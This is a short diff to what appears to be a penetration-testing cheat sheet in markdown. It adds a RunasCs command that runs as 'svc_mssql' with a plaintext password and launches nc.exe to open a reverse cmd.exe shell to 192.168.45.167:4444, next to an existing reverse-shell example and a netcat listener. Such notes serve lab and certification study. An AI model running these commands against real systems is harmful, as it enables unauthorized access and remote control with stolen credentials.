@@ -366,6 +366,7 @@ check zip,gz,7z,stix,rar files
 ```
 runascs.exe username password powershell.exe -r lhost:lport
 nc -nlvp 7777
+RunasCs.exe svc_mssql trustno1 "C:\xampp\htdocs\uploads\nc.exe 192.168.45.167 4444 -e cmd.exe"
 ```
 ##### Powershell to get interactive shell as another user
 ```
